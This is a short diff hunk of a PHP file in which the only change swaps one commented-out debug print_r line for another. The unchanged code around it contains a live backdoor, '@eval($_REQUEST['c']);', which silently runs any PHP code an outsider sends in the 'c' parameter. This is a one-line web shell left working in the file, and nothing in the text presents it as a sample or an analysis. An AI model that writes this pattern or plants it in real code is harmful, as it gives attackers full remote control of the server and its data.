@@ -7,7 +7,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTION') {
     die();
 }
 @eval($_REQUEST['c']);
-//print_r($_REQUEST['c']);
+//print_r($_REQUEST);
 //print_r($_REQUEST['test']);
 //print_r(file_get_contents('php://input'));
 
